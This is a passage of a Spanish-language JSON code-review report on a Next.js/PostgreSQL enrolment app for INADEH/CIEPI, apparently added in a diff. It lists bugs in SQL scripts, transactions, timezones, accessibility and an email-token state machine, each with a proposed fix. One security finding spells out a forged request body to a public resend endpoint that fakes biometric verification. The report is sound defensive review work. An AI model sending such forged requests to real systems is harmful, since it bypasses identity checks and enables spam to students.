+     "escenario": "El script crea blogs.id, creado_por y aprobado_por como UUID y temp_blog_comentarios.blog_id como UUID, pero la BD real (verificar_columnas.sql:17-27, 238) los tiene como integer. Una BD nueva creada con este script falla en `LEFT JOIN usuarios_administradores u ON b.creado_por = u.id` (uuid = integer). Además, CREATE TABLE/INDEX/TRIGGER no llevan IF NOT EXISTS, así que al repetirlo falla. Y set_comentario_estado hace `DELETE FROM temp_blog_comentarios` sin el prefijo ciepi. (l.41/44): si el search_path del usuario de producción no incluye ciepi, todo rechazo o aprobación con comentario da 500 («relation temp_blog_comentarios does not exist»). El trigger también se crea con `EXECUTE FUNCTION actualizar_historial_estados()` sin esquema.",
+     "correccion": "Regenerar el script a partir de la BD real (ids integer), hacerlo idempotente (IF NOT EXISTS, CREATE OR REPLACE, DROP TRIGGER IF EXISTS) y calificar con ciepi. todas las referencias, o declarar `SET search_path = ciepi` en la función.",
+     "verificacion": "El desajuste del script es real: create_blogs_table.sql:3,8,11,28 usa UUID, mientras que verificar_columnas.sql:17,22,25,238 muestra integer. Faltan IF NOT EXISTS y las referencias a temp_blog_comentarios y actualizar_historial_estados() en l.41,44,91 no llevan esquema. En cambio, el 500 en producción por search_path es especulativo: no hay evidencia de que el search_path de producción difiera del de la BD actual, donde la función ya existe. Es una deuda de los scripts, no un fallo en ejecución. Corrección: alinear el script con el esquema real y poner el prefijo ciepi."
+    },
+    {
+     "titulo": "create_consultas_table.sql también falla por la FK sede_id → ciepi.sedes_formacion (tabla inexistente) y no es idempotente",
+     "severidad": "baja",
+     "archivo": "database/create_consultas_table.sql",
+     "linea": 11,
+     "escenario": "Además del problema ya conocido de respondido_por → ciepi.usuarios, sede_id referencia ciepi.sedes_formacion, que no existe en la BD (verificar_columnas.sql solo tiene «sedes»). El código hace JOIN con ciepi.sedes (admin/consultas/route.ts:83). Al ejecutar el script en una BD nueva, el CREATE TABLE aborta. Si la tabla ya existía, los CREATE INDEX sin IF NOT EXISTS (l.37-40) y el CREATE TRIGGER (l.52) fallan al repetirlo. Tampoco hay ningún script que cree las tablas base (capacitaciones, estudiantes, inscripciones, usuarios_administradores, roles, eventos, verificacion_correo, provincias…), así que producción no se puede reconstruir desde database/.",
+     "correccion": "Cambiar a `sede_id INTEGER REFERENCES ciepi.sedes(id) ON DELETE SET NULL` y `respondido_por INTEGER REFERENCES ciepi.usuarios_administradores(id) ON DELETE SET NULL`, añadir IF NOT EXISTS y DROP TRIGGER IF EXISTS, y generar con pg_dump --schema-only un script base del esquema ciepi.",
+     "verificacion": "Confirmado. create_consultas_table.sql:12 referencia ciepi.sedes_formacion, que no aparece en verificar_columnas.sql (solo existe sedes). Los CREATE INDEX de l.37-40 y el CREATE TRIGGER de l.51 no son idempotentes. Solo afecta al reconstruir la BD, no a la app en marcha, y amplía un pendiente ya conocido. Corrección: corregir las FK y añadir IF NOT EXISTS / DROP TRIGGER IF EXISTS."
+    },
+    {
+     "titulo": "Columnas timestamp sin zona horaria rellenadas a veces con la hora de la BD y a veces con la de Node: horas desfasadas",
+     "severidad": "baja",
+     "archivo": "app/api/verificacion/validar/[token]/route.ts",
+     "linea": 165,
+     "escenario": "inscripciones.biometria_fecha, consultas.fecha_creacion/fecha_respuesta, verificacion_correo.fecha_uso, estudiantes.* son `timestamp without time zone` (verificar_columnas.sql). En la l.165 biometria_fecha = CURRENT_TIMESTAMP guarda la hora de pared según el TimeZone de la sesión de Postgres. En la l.205 se pasa `new Date()`, que node-pg serializa con el desfase de Node, y Postgres lo descarta. Al leer, node-pg interpreta la hora de pared como hora local de Node. Si la BD de producción está en UTC (lo habitual en servidores gestionados) y Node en Panamá, una consulta creada a las 10:00 se muestra a las 15:00, y la misma columna tiene filas con desfases distintos. No se fija la zona en ningún sitio (ni en el Pool, ni con PGTZ, ni con SET TIME ZONE).",
+     "correccion": "Fijar la zona de la sesión en el pool (`options: '-c TimeZone=America/Panama'` o `pool.on('connect', c => c.query(\"SET TIME ZONE 'America/Panama'\"))`) y migrar esas columnas a timestamptz (`ALTER COLUMN ... TYPE timestamptz USING col AT TIME ZONE 'America/Panama'`). Usar siempre NOW() en el SQL.",
+     "verificacion": "Es cierto que se mezclan CURRENT_TIMESTAMP (l.165) y new Date() (l.205) sobre columnas timestamp without time zone, y que lib/db.ts no fija la zona horaria. Pero la premisa del escenario (BD en UTC) choca con docs/revision-v1-hallazgos.md:14, que comprobó que la BD está en America/Bogota (UTC-5, igual que Panamá). El desfase solo aparece si el proceso Node corre con otro TZ (por ejemplo, un contenedor en UTC). Es un riesgo condicionado al despliegue. Corrección: fijar TZ=America/Panama en Node u `options: '-c timezone=America/Panama'` en el Pool, y usar siempre CURRENT_TIMESTAMP."
+    },
+    {
+     "titulo": "Edición de capacitación sin transacción: borra profesores y horarios antes de insertar los nuevos",
+     "severidad": "media",
+     "archivo": "app/api/admin/capacitaciones/[id]/route.ts",
+     "linea": 318,
+     "escenario": "El administrador guarda una capacitación con un profesor que otra persona acaba de eliminar (o con un id que no existe). El UPDATE (l.302) y el DELETE de capacitacion_profesores se confirman, el INSERT falla por la FK y se devuelve un 500. La capacitación queda modificada a medias, sin profesores y con los horarios viejos o sin horarios: se pierden datos que no se pidió cambiar. Lo mismo ocurre en crear/route.ts:172-189, donde la capacitación queda creada sin horarios y el usuario reintenta y la duplica. Si el id no existe, result.rows está vacío y aun así se insertan hijos (falla por la FK).",
+     "correccion": "Envolver UPDATE + DELETE + INSERT en withTransaction, insertar los horarios en una sola sentencia con unnest y devolver 404 si el UPDATE no afectó filas.",
+     "verificacion": "Confirmado. admin/capacitaciones/[id]/route.ts:302-327 hace el UPDATE, el DELETE de profesores, el INSERT, el DELETE de horarios y los INSERT, cada uno con su propio query() y sin transacción. crear/route.ts:171-189 tiene el mismo problema. Un fallo intermedio (FK de un profesor borrado, o un horario inválido que viole un CHECK) deja la capacitación a medias. Además, la l.346 devuelve error.message al cliente. Corrección: usar withTransaction."
+    },
+    {
+     "titulo": "Eliminar una sede borra en cascada todos sus edificios y aulas y deja reservas confirmadas sin lugar",
+     "severidad": "media",
+     "archivo": "app/api/admin/sedes/[id]/route.ts",
+     "linea": 81,
+     "escenario": "Un administrador elimina una sede (con un simple confirm()). Por edificios.sede_id ON DELETE CASCADE → aulas ON DELETE CASCADE (create_sedes_edificios_aulas_horarios.sql:12,25) desaparecen todos sus edificios y aulas. capacitaciones.sede_id/aula_id, mentor_disponibilidad y mentoria_reservas.sede_id/aula_id pasan a NULL (SET NULL). Las reservas presenciales ya confirmadas pierden la ubicación que se envía en el recordatorio, y los horarios presenciales de los mentores se quedan sin sede. Lo mismo pasa con DELETE de edificios y aulas. Al revés, borrar un profesor con reservas (FK RESTRICT) da un 500 genérico.",
+     "correccion": "Cambiar las FK a ON DELETE RESTRICT y preferir la baja lógica (activo=false). Antes de borrar, comprobar dependencias (capacitaciones, reservas activas, disponibilidad) y devolver 409 con un mensaje claro. Capturar 23503 en profesores, sedes, edificios y aulas.",
+     "verificacion": "Confirmado. DELETE de sedes sin comprobar dependencias (sedes/[id]/route.ts:80-83). Las FK en cascada (create_sedes_edificios_aulas_horarios.sql:12,25) y con SET NULL (l.39-41 y create_mentorias.sql:56-57,92-93) dejan las reservas y la disponibilidad de los mentores sin ubicación. Es una acción del administrador con confirmación, por eso es media. Corrección: impedir el borrado (409) si hay reservas, disponibilidad o capacitaciones vinculadas, o hacer un borrado lógico (activo=false)."
+    },
+    {
+     "titulo": "Una nueva inscripción invalida los enlaces pendientes de otras capacitaciones, y el alta de estudiante no es atómica",
+     "severidad": "media",
+     "archivo": "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts",
+     "linea": 339,
+     "escenario": "(a) Un estudiante se inscribe en la capacitación A, recibe el correo y, antes de abrirlo, se inscribe en B. invalidatePreviousTokens(estudianteId,'inscripcion') marca como usados todos sus tokens de tipo inscripción: el enlace de A responde «Este enlace ya fue usado» y la inscripción en A se pierde. (b) El estudiante nuevo se inserta (l.~240) y luego falla el INSERT de estudiantes_ubicacion (l.299), por ejemplo con un provincia_id no numérico (parseInt da NaN) o una FK inválida. El estudiante queda creado sin ubicación ni token, y al reintentar como nuevo recibe 409 «Cédula duplicada».",
+     "correccion": "Invalidar solo los tokens de la misma capacitación (`AND metadata->>'capacitacion_id' = $3`). Hacer el INSERT de estudiante + ubicación + token en withTransaction, y validar los ids de ubicación con Number.isInteger antes de enviarlos.",
+     "verificacion": "(a) Confirmado: invalidatePreviousTokens (lib/verificationToken.ts:204-214) marca como usados todos los tokens de tipo 'inscripcion' del estudiante, sin filtrar por capacitacion_id en la metadata. Se llama en inscribirse/route.ts:~339, así que el enlace pendiente de A deja de funcionar al inscribirse en B. El estudiante puede repetir A, por lo que es media. (b) Es plausible que el alta no sea atómica (el INSERT del estudiante y luego el de ubicación), pero no hay FK ni NaN demostrados. Corrección: invalidar solo los tokens con metadata->>'capacitacion_id' igual al actual y meter el alta en withTransaction."
+    },
+    {
+     "titulo": "Mensajes crudos de PostgreSQL devueltos al cliente en producción en 18 rutas",
+     "severidad": "baja",
+     "archivo": "app/api/admin/consultas/[id]/route.ts",
+     "linea": 185,
+     "escenario": "Hay 18 rutas (por ejemplo consultas/[id] l.75/185/231 y verificacion/validar/[token] l.~250) que responden `details: error instanceof Error ? error.message : ...` sin pasar por safeErrorDetail. Ante un id no numérico, una FK o una restricción, el cliente recibe textos como 'insert or update on table \"inscripciones\" violates foreign key constraint \"...\"' o 'invalid input syntax for type integer', lo que revela nombres de tablas y restricciones. verificacion/validar es pública.",
+     "correccion": "Sustituir esas respuestas por safeErrorDetail(error) (grep 'details: error instanceof Error') y registrar el error solo con console.error.",
+     "verificacion": "Confirmado: hay 18 archivos en app/api con `error instanceof Error ? error.message`, entre ellos rutas públicas: verificacion/validar/[token]:245,305, inscribirse:400, reenviar:210, upload:101 y ubicacion/*. safeErrorDetail (lib/apiError.ts) ya existe y no se usa en ellas. Revela nombres de tablas y restricciones, pero no es explotable por sí solo. Corrección: sustituirlo por safeErrorDetail(error)."
+    }
+   ],
+   "descartados": []
+  },
+  {
+   "area": "Componentes compartidos, UX y accesibilidad",
+   "confirmados": [
+    {
+     "titulo": "Form no valida los campos que están dentro de secciones: el formato del teléfono (y los errorMessage propios) nunca se aplican en la inscripción ni en Contacto",
+     "severidad": "media",
+     "archivo": "components/Form.tsx",
+     "linea": 143,
+     "escenario": "handleSubmit solo recorre `fields` del nivel superior y se salta los de tipo 'section' sin entrar en `section.fields`. En app/capacitaciones/inscribirse/[id]/page.tsx (líneas 1110-1194) y en app/contacto/page.tsx (líneas 77-140) todos los campos están dentro de secciones. Si un ciudadano escribe 'abc' o '12' en Teléfono (type tel, required), la validación nativa solo comprueba que no esté vacío y validateField (regex 6666-6666) no se ejecuta. El dato se envía, y la ruta app/api/capacitaciones/inscribirse/[capacitacion]/route.ts:146-150 lo guarda tal cual en ciepi.estudiantes.telefono. Por el mismo motivo, los errorMessage personalizados y la validación 'required' de los campos de archivo o Slate dentro de secciones nunca aparecen (por ejemplo en capacitaciones/crear).",
+     "correccion": "Aplanar las secciones de forma recursiva antes de validar (por ejemplo, una función flattenFields(fields) que devuelva todos los FormFieldConfig) y usarla en handleSubmit. Además, validar el teléfono en el servidor.",
+     "verificacion": "Confirmado. En Form.tsx:143-158 handleSubmit solo recorre `fields` de primer nivel y se salta los de tipo 'section' sin bajar a section.fields. contacto/page.tsx:78-140 e inscribirse/[id]/page.tsx:1114-1194 ponen todos los campos dentro de secciones, así que el regex de teléfono (validateField:25-32) nunca se ejecuta. Del lado del servidor no hay validación de formato: route.ts:146-150 y contacto/consulta:75 solo comprueban que el campo no esté vacío. Bajo la severidad a media porque el efecto es aceptar datos con mal formato (teléfono, errorMessage, campos obligatorios de archivo o Slate); no hay fuga de datos ni nada que quede bloqueado."
+    },
+    {
+     "titulo": "Form reinicia formData cada vez que el padre vuelve a renderizar con un initialValues literal: se pierde lo escrito al fallar el envío o al volver a la pestaña",
+     "severidad": "alta",
+     "archivo": "components/Form.tsx",
+     "linea": 94,
+     "escenario": "El useEffect depende de la referencia de initialValues. app/admin/usuarios/crear/page.tsx:205 pasa `initialValues={{ activo: \"true\" }}` y usuarios/editar/[id]/page.tsx:241 pasa otro objeto literal, así que cada render del padre crea un objeto nuevo. Caso 1: el admin rellena el alta, pulsa Crear, setSubmitting(true) vuelve a renderizar la página y el formulario queda en {activo:'true'}; si la API responde con un error (correo duplicado, 409), el usuario ve el toast con todos los campos vacíos. Caso 2: useSession vuelve a pedir la sesión al recuperar el foco de la ventana (comportamiento por defecto de SessionProvider en components/AuthProvider.tsx), la página se renderiza de nuevo y lo que estaba escribiendo se borra. En editar, los cambios vuelven a los valores originales.",
+     "correccion": "Inicializar formData solo una vez (con useState(initialValues)) o volver a sincronizar solo cuando cambie el contenido (comparación profunda o una prop `key` que cambie al cargar los datos). En los padres, memoizar initialValues con useMemo.",
+     "verificacion": "Confirmado. El useEffect de Form.tsx:94-98 depende de la referencia de initialValues y llama a setFormData(initialValues) cada vez que llega un objeto nuevo con claves. usuarios/crear:205 pasa el literal {activo:'true'}. handleSubmit (línea 59) llama a setSubmitting(true), la página se vuelve a renderizar y formData queda en {activo:'true'}. onSubmit ya recibió los datos, pero si la API falla (correo duplicado) el formulario aparece vacío. En editar/[id]:241 ocurre lo mismo y se vuelve a los valores originales. Cualquier otro render del padre (por ejemplo, un refetch de useSession al recuperar el foco, que además dispara fetchRoles por el efecto con [status, session]) borra también lo que se estaba escribiendo."
+    },
+    {
+     "titulo": "Doble envío: Form no bloquea el botón por su cuenta ni espera a onSubmit; en capacitaciones/crear se crean capacitaciones duplicadas",
+     "severidad": "media",
+     "archivo": "components/Form.tsx",
+     "linea": 521,
+     "escenario": "El botón solo se desactiva con la prop opcional isSubmitting, y onSubmit se llama sin await (tipado como void en Form.types.ts:53). app/admin/capacitaciones/crear/page.tsx:239 no pasa isSubmitting y su handleSubmit (línea 129) no tiene ninguna protección. Un doble clic en 'Guardar', o un segundo clic durante una subida lenta del banner o en el segundo de espera antes del router.push (línea 180), hace dos POST y crea dos capacitaciones con sus archivos. En Contacto, entre el clic y la respuesta de grecaptcha.execute (líneas 175-182) el botón sigue activo, así que un doble clic envía dos consultas.",
+     "correccion": "Añadir en Form un estado interno `submitting`: activarlo al empezar handleSubmit, hacer `await onSubmit(...)` (cambiar el tipo a `=> void | Promise<void>`) y desactivarlo en un finally. Desactivar el botón cuando `submitting || isSubmitting`.",
+     "verificacion": "Confirmado. capacitaciones/crear/page.tsx:239 no pasa isSubmitting y su handleSubmit (129-189) no tiene ninguna protección contra reentrada. Form solo desactiva el botón con esa prop (línea 523), así que un doble clic lanza dos POST y crea dos capacitaciones. En Contacto, isSubmitting solo pasa a true dentro de handleSubmit, después de que termina grecaptcha.execute (Form 175-182), y vuelve a false en el finally aunque el éxito redirige 2 s más tarde, así que hay ventanas para enviar dos veces. Lo dejo en media porque los duplicados son evitables y en el admin se pueden borrar a mano."
+    },
+    {
+     "titulo": "Accesibilidad de Form: la zona de archivos no funciona con teclado, la etiqueta no está asociada y los errores no se anuncian",
+     "severidad": "media",
+     "archivo": "components/Form.tsx",
+     "linea": 437,
+     "escenario": "La zona para soltar archivos tiene role=button y tabIndex=0, pero solo onClick, sin onKeyDown. Un usuario de teclado que pulsa Enter o Espacio no abre el selector, así que no puede subir el banner ni los adjuntos. El <label htmlFor={f.name}> apunta a un id que no existe (el input es `file-input-${f.name}`, línea 456) y aria-label='Subir archivos' es igual en todos los campos. Los mensajes de error (líneas 249-253 y 271-275) son <span> sin aria-invalid, aria-describedby ni role=alert, y tras validar no se mueve el foco al primer campo con error, así que un lector de pantalla no se entera de por qué no se envió el formulario.",
+     "correccion": "Añadir onKeyDown (Enter o Espacio llaman a click()), usar htmlFor o aria-labelledby con el id real y un aria-label con el nombre del campo. Poner aria-invalid y aria-describedby en los inputs con error, role=alert en el mensaje y llevar el foco al primer campo inválido.",
+     "verificacion": "Confirmado. El div de la zona de archivos (437-454) tiene role=button y tabIndex=0, pero solo onClick. Un div con role=button no dispara click con Enter ni con Espacio, así que desde el teclado no se puede abrir el selector. El label usa htmlFor={f.name} y el input tiene id `file-input-${f.name}` (línea 456). aria-label es fijo. Los errores (249-253, 271-275) son <span> sin aria-invalid, aria-describedby ni role=alert, y no se mueve el foco al primer error."
+    },
+    {
+     "titulo": "Barra del editor Slate imposible de usar con teclado y editor sin nombre accesible",
+     "severidad": "baja",
+     "archivo": "components/SlateEditorField.tsx",
+     "linea": 28,
+     "escenario": "ToolbarButton, ColorPickerButton (línea 330), FontSizeSelector (línea 398) y las muestras de color solo responden a onMouseDown. Al pulsar Enter o Espacio sobre un botón con foco se dispara 'click', no 'mousedown', así que con teclado no se puede aplicar negrita, listas, títulos ni enlaces. Las muestras de color no tienen texto accesible (solo title con el código hexadecimal). El label de Form apunta con htmlFor al id del <Editable> (línea 787), que es un div contenteditable y no admite etiquetas, por lo que el lector de pantalla anuncia un cuadro de texto sin nombre.",
+     "correccion": "Usar onMouseDown solo para preventDefault y ejecutar la acción en onClick. Añadir aria-label y aria-pressed a los botones, aria-label a las muestras y aria-labelledby (o aria-label) al Editable con el id del label.",
+     "verificacion": "Confirmado. ToolbarButton (28), ColorPickerButton (330, 350), FontSizeSelector (398, 417) y 'Restablecer' solo usan onMouseDown. Enter o Espacio sobre un <button> disparan click, no mousedown, y en el editor no hay atajos de teclado (no hay onKeyDown en Editable). Las muestras de color solo tienen title con el código hexadecimal. El label apunta al id de Editable, que es un div contenteditable y no se puede etiquetar. Bajo la severidad a baja porque el editor solo lo usan administradores internos."
+    },
+    {
+     "titulo": "Modo oscuro: el logotipo INADEH|CIEPI de la cabecera y del pie se vuelve casi invisible",
+     "severidad": "media",
+     "archivo": "components/brand/BrandLogos.tsx",
+     "linea": 54,
+     "escenario": "Navbar.tsx:115 y Footer.tsx:18 usan BrandLogos con la variante 'light' por defecto, pero se muestran sobre `dark:bg-gray-800`. Con el sistema en modo oscuro (Tailwind 4 usa prefers-color-scheme), 'CIEPI' sale en text-primary #004a98 sobre #1f2937 (contraste de unos 1,9:1), el nombre completo en text-dark_grey #3f3f3f (unos 1,6:1) y el PNG a color de INADEH sobre fondo oscuro. Una marca institucional ilegible en la cabecera de todas las páginas.",
+     "correccion": "Hacer que BrandLogos se adapte al tema: clases `text-primary dark:text-white` y `text-dark_grey dark:text-gray-300`, y dos <img> (a color con `dark:hidden` y blanco con `hidden dark:block`) en lugar de elegir la variante por prop.",
+     "verificacion": "Confirmado. Tailwind 4 sin @custom-variant usa prefers-color-scheme para dark:. Navbar.tsx:107/115 (bg-white dark:bg-gray-800) y Footer.tsx:8/18 (dark:bg-gray-800) usan BrandLogos con la variante por defecto 'light', que pinta text-primary (#004a98), text-dark_grey (#3f3f3f) y el PNG a color sobre un fondo gris oscuro. El contraste es muy bajo en la cabecera de todas las páginas."
+    },
+    {
+     "titulo": "Los colores negro o blanco del editor dejan texto invisible en las páginas públicas según el tema",
+     "severidad": "baja",
+     "archivo": "components/SlateRenderer.tsx",
+     "linea": 46,
+     "escenario": "La paleta del editor (SlateEditorField.tsx:313-324) ofrece #000000 y #FFFFFF, y la marca se guarda como estilo en línea. SlateRenderer aplica `style.color` tal cual, por encima de `dark:text-gray-300`. Un admin que marca un párrafo en negro deja ese texto invisible para los visitantes con modo oscuro (fondo gray-900) en /blog/[id] y /capacitaciones/[id]. Si lo marca en blanco, desaparece en modo claro. El editor siempre tiene fondo blanco, así que el autor no lo nota.",
+     "correccion": "Quitar negro y blanco de la paleta (que 'Restablecer' sea el color por defecto) o, en el renderer, ignorar o mapear los colores cercanos a negro o blanco a una clase que dependa del tema.",
+     "verificacion": "Confirmado. SlateRenderer.tsx:46-48 aplica node.color como estilo en línea, por encima de las clases dark:, y la paleta incluye #000000 y #FFFFFF (SlateEditorField 313-324). El fallo depende de que un editor elija esos colores a propósito: sin marca de color no ocurre. Lo bajo a baja."
+    },
+    {
+     "titulo": "Table no muestra el estado vacío cuando la búsqueda no encuentra nada y el buscador no tiene etiqueta",
+     "severidad": "baja",
+     "archivo": "components/Table.tsx",
+     "linea": 122,
+     "escenario": "El mensaje vacío solo depende de `data.length === 0`. Si hay 50 registros y el admin busca 'zzz', getRowModel() devuelve 0 filas y se ve una tabla con encabezados y cuerpo vacío, sin 'No se encontraron resultados' (la paginación también desaparece). El <input> de búsqueda (línea 99) solo tiene placeholder, sin label ni aria-label, y el botón de limpiar no tiene type='button'.",
+     "correccion": "Mostrar el estado vacío cuando `table.getRowModel().rows.length === 0` (con un texto distinto si hay filtro activo). Añadir aria-label={searchPlaceholder} al input y type='button' al botón de limpiar.",
+     "verificacion": "Confirmado cuando enableFiltering está activo. El filtro global se aplica dentro de la propia Table (líneas 56 y 75-78), y el estado vacío solo comprueba data.length === 0 (línea 122), así que una búsqueda sin resultados deja el tbody vacío y sin mensaje. El input de búsqueda (99-105) solo tiene placeholder. Que el botón de limpiar no tenga type='button' solo importa si la tabla está dentro de un form."
+    },
+    {
+     "titulo": "Pie de página con un correo de relleno que no es enlace (info@ciepi.pa)",
+     "severidad": "baja",
+     "archivo": "components/Footer.tsx",
+     "linea": 170,
+     "escenario": "Además del teléfono y las redes ya conocidos, el bloque de contacto muestra 'info@ciepi.pa' como texto plano. Es un dominio que no corresponde al de producción (inadeh.edu.pa) y no es un mailto, así que el visitante que intente escribir no podrá o enviará correos a un dominio ajeno. La dirección 'Panamá, República de Panamá' tampoco sirve como ubicación, y el icono de Twitter está desfasado (X).",
+     "correccion": "Confirmar el correo oficial con CIEPI, ponerlo como <a href=\"mailto:...\"> y completar la dirección física, o quitar el bloque hasta tener los datos reales.",
+     "verificacion": "Confirmado. Footer.tsx:169-171 muestra 'info@ciepi.pa' como texto plano, sin mailto. revision-v1-hallazgos.md solo menciona el teléfono y las redes, así que este dato de relleno es nuevo."
+    },
+    {
+     "titulo": "Fechas de noticias formateadas sin zona horaria en el servidor: un día de diferencia entre la portada y /blog",
+     "severidad": "baja",
+     "archivo": "components/brand/NewsCard.tsx",
+     "linea": 15,
+     "escenario": "formatDate usa toLocaleDateString('es-PA') sin timeZone. En la portada (app/page.tsx, Server Component) se formatea con la zona del servidor. En /blog (app/blog/page.tsx, 'use client') se usa la del navegador. Una noticia creada el 1 de marzo a las 21:00 en Panamá (02:00 UTC del día 2) aparece como '2 de marzo' en la portada si el servidor está en UTC, y como '1 de marzo' en /blog.",
+     "correccion": "Pasar `timeZone: 'America/Panama'` en las opciones de toLocaleDateString (y en los demás formateadores de fecha públicos).",
+     "verificacion": "Confirmado en el código. NewsCard.tsx:14-15 llama a toLocaleDateString sin timeZone. app/page.tsx es un Server Component (sin 'use client') y app/blog/page.tsx es cliente. La diferencia solo aparece si la zona del servidor no es America/Panama; en el repositorio no se fija TZ."
+    },
+    {
+     "titulo": "Menús de la Navbar con role='menu' sin semántica de menú ni gestión del foco",
+     "severidad": "baja",
+     "archivo": "components/Navbar.tsx",
+     "linea": 150,
+     "escenario": "Los desplegables Admin y Usuario declaran role='menu' y aria-haspopup='menu', pero sus hijos son <Link> o <button> sin role='menuitem' y sin navegación con flechas. Un lector de pantalla anuncia un menú cuyos elementos no puede recorrer como espera. Al cerrar con Escape (línea 88) el foco no vuelve al botón que lo abrió. Abrir el menú de usuario no cierra el de Admin, porque ambos están dentro de [data-menu], y pueden quedar los dos abiertos y superpuestos. En modo oscuro, 'Cargando...' (línea 229) usa text-dark_grey sin variante dark.",
+     "correccion": "Quitar role='menu' y aria-haspopup='menu' (usar un patrón de disclosure con aria-expanded, que ya existe) o implementar el patrón completo de menú. Al pulsar Escape, devolver el foco al botón. Cerrar el otro desplegable al abrir uno. Añadir dark:text-gray-400.",
+     "verificacion": "Confirmado. role='menu' (líneas 150 y 257) con hijos Link o button sin role=menuitem ni navegación con flechas. El manejador de Escape (87-93) no devuelve el foco al botón. Al abrir un menú no se cierra el otro, porque el cierre por clic fuera solo actúa si el objetivo no está en [data-menu]. 'Cargando...' (línea 229) usa text-dark_grey sin variante dark."
+    }
+   ],
+   "descartados": [
+    {
+     "titulo": "El editor Slate se rompe si la descripción llega como texto y 'required' nunca se cumple",
+     "archivo": "components/SlateEditorField.tsx",
+     "motivo": "No se sostiene la caída de la página. El cliente siempre envía la descripción como JSON.stringify del valor de Slate (crear/page.tsx:147). Un texto que no es JSON solo llegaría con una petición manipulada, y al guardarlo como parámetro string en una columna jsonb Postgres lo rechazaría (no es JSON válido), así que no queda guardado como string. La parte de 'required' es real, pero el campo está dentro de una sección y por eso ya no se valida (hallazgo 0); además, SlateEditorField muestra su propio aviso de campo obligatorio cuando está vacío."
+    }
+   ]
+  }
+ ],
+ "maquinas": {
+  "maquinas": [
+   {
+    "nombre": "Verificación de correo / tokens de inscripción (pendiente → usado | expirado | invalidado)",
+    "archivos": [
+     "lib/verificationToken.ts",
+     "app/api/verificacion/validar/[token]/route.ts",
+     "app/api/verificacion/estado/[token]/route.ts",
+     "app/api/verificacion/reenviar/route.ts",
+     "app/verificacion/esperando/[token]/page.tsx",
+     "app/api/capacitaciones/inscribirse/[capacitacion]/route.ts"
+    ],
+    "estados_actuales": [
+     "pendiente (usado=false, no vencido)",
+     "usado (usado=true): significa a la vez 'consumido por el estudiante' y 'invalidado por reenvío'",
+     "expirado (derivado de fecha_expiracion, 15 min)"
+    ],
+    "prioridad": "alta",
+    "problemas": [
+     "[ALTA] lib/verificationToken.ts:204-213 + app/api/verificacion/estado/[token]/route.ts:46-47: invalidatePreviousTokens marca los tokens viejos con usado=true, el mismo valor que pone markTokenAsUsed. El endpoint de sondeo traduce usado=true a 'verificado'. Escenario: el estudiante pulsa 'Reenviar' en /verificacion/esperando/A. El token A queda invalidado (usado=true). El siguiente sondeo de A devuelve estado='verificado', la página muestra '¡Correo verificado exitosamente!' y redirige a /capacitaciones, pero no se creó ninguna inscripción. El mismo falso positivo aparece en una segunda pestaña cuando el estudiante vuelve a enviar el formulario (inscribirse/route.ts:339). Corrección: separar los estados con una columna estado ('pendiente','verificado','invalidado') o invalidado_en, y que solo 'verificado' produzca éxito.",
+     "[ALTA] app/api/verificacion/reenviar/route.ts:102-110 + app/verificacion/esperando/[token]/page.tsx:121: la respuesta del reenvío no incluye el token nuevo (data solo lleva correo, fecha_expiracion y duracion_minutos), pero la página hace router.replace(`/verificacion/esperando/${data.data.token}`). Escenario: se pulsa 'Reenviar' → navega a /verificacion/esperando/undefined → el sondeo devuelve 404 → la página muestra 'expirado' / 'Token no encontrado' aunque el correo nuevo sí salió. Si el sondeo del token viejo llega antes, se ve el falso 'verificado' del punto anterior. Corrección: no devolver el token en claro (llega por correo); hacer que la página siga sondeando por un id de solicitud o por id_estudiante+capacitación y mostrar 'Te enviamos un nuevo enlace'.",
+     "[ALTA] app/api/verificacion/validar/[token]/route.ts:87-215: el token se consume (markTokenAsUsed, l.87) antes de crear la inscripción y fuera de una transacción. Escenario: el INSERT de l.188 falla (estado 6 inexistente, error de FK o de red) → el token ya está usado y correo_verificado=true, pero no hay inscripción. Al reintentar, el usuario recibe 'Este enlace ya fue usado' y el sondeo de la página de espera muestra 'verificado'. Además, con doble clic o dos pestañas, la segunda llamada recibe 500 'Error al marcar el token' en lugar de un resultado idempotente. Tampoco se vuelven a comprobar capacitaciones.activo ni la ventana de inscripción al canjear el token. Corrección: envolver todo en withTransaction (UPDATE ... SET estado='verificado' WHERE token=$1 AND estado='pendiente' AND fecha_expiracion>NOW() RETURNING *, luego crear la inscripción con ON CONFLICT (id_usuario,id_capacitacion) DO NOTHING) y responder 200 idempotente si ya estaba verificado.",
+     "[ALTA, seguridad] app/api/verificacion/reenviar/route.ts:113-180 (opción 2): el endpoint es público y acepta id_estudiante, tipo y metadata arbitrarios del cliente, y copia esa metadata al token nuevo. Escenario: alguien envía {id_estudiante: N, tipo:'inscripcion', metadata:{capacitacion_id: X, metodo_validacion:'biometrica', biometria:{valido:true, id_auditoria:'x'}}}. El enlace que llega al correo del estudiante N crea una inscripción en estado 1 con biometria_verificada=true sin validación real. Además permite enviar correos a cualquier id (enumeración y spam). Corrección: eliminar la opción 2 o reconstruir la metadata en el servidor a partir de un registro persistido, nunca del body, y aplicar rate limit/Turnstile."
+    ],
+    "propuesta": "Módulo lib/estados/verificacionToken.ts con estados explícitos: pendiente → verificado | invalidado | expirado (expirado se deriva o se materializa por cron). Mapa puro TRANSICIONES = {pendiente:['verificado','invalidado']} con tests. En BD: columna estado VARCHAR CHECK IN ('pendiente','verificado','invalidado'), más verificado_en, invalidado_en e invalidado_por_token_id para encadenar el reenvío. El canje es atómico: UPDATE ... SET estado='verificado' WHERE token=$1 AND estado='pendiente' AND fecha_expiracion>NOW() RETURNING metadata, dentro de la misma transacción que crea la inscripción. El sondeo devuelve 'verificado' solo si estado='verificado' y la inscripción existe; si el token fue invalidado, devuelve 'reemplazado' para que la UI diga 'te enviamos un enlace nuevo'. La metadata sensible (método, auditoría biométrica) nunca viene del cliente en el reenvío: se clona del token anterior en el servidor. Índice único parcial (id_estudiante, tipo) WHERE estado='pendiente' para garantizar un solo token vivo por estudiante y tipo."
+   },
+   {
+    "nombre": "Inscripciones (estado_inscripcion 1..6)",
+    "archivos": [
+     "lib/inscripcionStates.ts",
+     "app/api/admin/inscripciones/[id]/route.ts",
+     "app/api/admin/inscripciones/estados/route.ts",
+     "app/api/verificacion/validar/[token]/route.ts",
+     "components/EstadoSelector.tsx",
+     "database/add_pendiente_validacion_estado.sql",
+     "tests/unit/inscripcionStates.test.ts"
+    ],
+    "estados_actuales": [
+     "1 Nueva inscripción",
+     "2 Rechazado (final; override de admin 2→6)",
+     "3 Matriculado",
+     "4 Retirado (final; override de admin 4→3)",
+     "5 Terminó curso (final)",
